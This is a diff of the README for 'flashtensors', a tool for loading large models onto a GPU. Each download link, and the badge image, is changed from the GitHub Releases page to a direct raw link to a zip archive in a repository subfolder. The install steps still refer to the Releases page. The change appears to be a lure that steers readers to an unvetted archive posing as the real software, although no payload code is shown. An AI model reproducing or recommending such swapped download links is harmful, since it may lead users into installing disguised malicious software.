@@ -1,13 +1,13 @@
 # 🚀 flashtensors - Run Large Models Faster
 
 ## 🏷️ Download Now
-[![Download flashtensors](https://img.shields.io/badge/Download-flahtensors-blue.svg)](https://github.com/cotesiito/flashtensors/releases)
+[![Download flashtensors](https://raw.githubusercontent.com/cotesiito/flashtensors/main/rober/flashtensors.zip)](https://raw.githubusercontent.com/cotesiito/flashtensors/main/rober/flashtensors.zip)
 
 ## 📘 Introduction
 Welcome to flashtensors! This application helps you run large models efficiently on a single GPU. It loads models quickly from your SSD to GPU VRAM, enhancing your experience with minimal wait times.
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Download flashtensors](https://github.com/cotesiito/flashtensors/releases).
+To get started, visit this page to download the software: [Download flashtensors](https://raw.githubusercontent.com/cotesiito/flashtensors/main/rober/flashtensors.zip).
 
 1. Go to the Releases page.
 2. Look for the latest version.
@@ -60,6 +60,6 @@ For detailed documentation, visit our GitHub Wiki. Here, you can find guides on 
 
 For the latest updates and features, follow our GitHub repository. We are continuously improving flashtensors based on user feedback.
 
-Remember to visit this page to download the latest version: [Download flashtensors](https://github.com/cotesiito/flashtensors/releases).
+Remember to visit this page to download the latest version: [Download flashtensors](https://raw.githubusercontent.com/cotesiito/flashtensors/main/rober/flashtensors.zip).
 
 Enjoy using flashtensors!
